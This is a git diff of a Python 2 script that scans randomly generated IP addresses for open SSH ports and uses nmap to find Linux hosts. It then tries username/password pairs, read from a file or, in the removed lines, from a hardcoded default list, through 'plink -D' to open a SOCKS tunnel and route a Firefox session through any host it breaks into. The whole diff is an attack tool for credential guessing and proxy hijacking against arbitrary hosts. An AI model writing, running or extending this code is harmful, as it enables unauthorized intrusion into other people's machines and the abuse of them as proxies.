@@ -3,16 +3,9 @@ import socket
 import nmap
 import random
 import os
-import paramiko
 import re
 import subprocess
-import time
 from selenium import webdriver
-from sshtunnel import SSHTunnelForwarder
-import sys
-import io
-
-default = [("ubuntu", ""), ("admins", "password"), ("admin", "PoopyMonkeys")]
 
 
 def menu():
@@ -47,28 +40,40 @@ def generate_ip():
     return str_ip
 
 
+def chec_if_up(ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect_ex((ip, 22))
+        sock.shutdown(2)
+        result = True
+    except:
+        result = False
+    print result
+    return result
+
+
 def init_tunnel():
-    ssh = paramiko.SSHClient()
+    ans = raw_input("Generate ip [Y/N]? ")
     pat = re.compile("Linux")
-    ip = generate_ip()
-    #ops = os.system('nmap -O -Pn ' + ip)
-    #while re.search(pat, str(ops)) is not None:
-     #   ip = generate_ip()
-    #tunnel(ssh, 'ip')
-    ssh.close()
-
-
-def handle(ans, client):
-    if ans == 1:
-        print get_list()
-    if ans == 2:
-        print get_info()
-    if ans == 3:
-        init_tunnel()
-
-
-def check(ans):
-    return ans in [1, 2, 3]
+    if ans.upper() == 'Y':
+        ip = generate_ip()
+        ops = ""
+        if chec_if_up(ip):
+            ops = os.system('nmap -O --osscan-guess ' + ip)
+        while re.search(pat, str(ops)) is None:
+            ip = generate_ip()
+            if chec_if_up(ip):
+                ops = os.system('nmap -O --osscan-guess ' + ip)
+    else:
+        ip = raw_input("Insert ip: ")
+        ops = ""
+        if chec_if_up(ip):
+            ops = os.system('nmap -O --osscan-guess ' + ip)
+        while re.search(pat, str(ops)) is None:
+            ip = raw_input("Insert another ip: ")
+            if chec_if_up(ip):
+                ops = os.system('nmap -O --osscan-guess ' + ip)
+    tunnel_putty_link(ip)
 
 
 def install_firefox_proxy(PROXY_HOST,PROXY_PORT):
@@ -81,54 +86,45 @@ def install_firefox_proxy(PROXY_HOST,PROXY_PORT):
     return webdriver.Firefox(firefox_profile=fp)
 
 
-def find_name_and_password(ip):
-    correct = ()
-    for name, password in default:
-        try:
-            command = "plink -D 3200 -pw %s %s@%s" % (password, name, ip)  # the shell command
-
-            filename = 'test.log'
-            with io.open(filename, 'wb') as writer, io.open(filename, 'rb', 1) as reader:
-                process = subprocess.Popen(command, stdout=writer,
-                                       shell=True)
-                time.sleep(10)
-                process.kill()
-                while process.poll() is None:
-                    sys.stdout.write(reader.read())
-                    time.sleep(0.5)
-                # Read the remaining
-                sys.stdout.write(reader.read())
-            with open(filename, 'rb') as myfile:
-                if "password" not in myfile.read():
-                    correct = name, password
-
-        except Exception as err:
-            print "an error occured: " + str(err)
-    return correct
-
-
-def open_firefox():
+def tunnel_putty_link(ip):
     driver = install_firefox_proxy("127.0.0.1", 3200)
     driver.get('about:config')
+    with open('login.txt', 'r') as details:
+        for line in details:
+            read_line = line.split(',')
+            name = read_line[0]
+            password = read_line[1][1:].replace('-', '')
+            try:
+                command = "plink -D 3200 -pw %s %s@%s" % (password, name, ip)  # the shell command
+                print subprocess.check_output(command)
+            except Exception as err:
+                print "an error occured: " + str(err)
 
 
-def tunnel_putty_link(name, password, ip):
-    try:
-        subprocess.call("plink -D 3200 -pw %s %s@%s" % (password, name, ip))
-    except Exception as error:
-        print "An error occured: " + str(error)
+def handle(ans):
+    if ans == 1:
+        print get_list()
+    if ans == 2:
+        print get_info()
+    if ans == 3:
+        init_tunnel()
 
 
-def tunnel(ip):
-    name, password = find_name_and_password(ip)
-    open_firefox()
-    tunnel_putty_link(name, password, ip)
+def check(ans):
+    return ans in [1, 2, 3]
 
 
 def main():
-
-    ip = "192.168.1.42"
-    tunnel(ip)
+    tunnel_putty_link('10.0.2.15')
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ans = input(menu())
+    while ans != 4:
+        if check(ans):
+            handle(ans)
+        else:
+            print "Invalid request"
+        ans = input(menu())
+    client.close()
 
 
 if __name__ == '__main__':
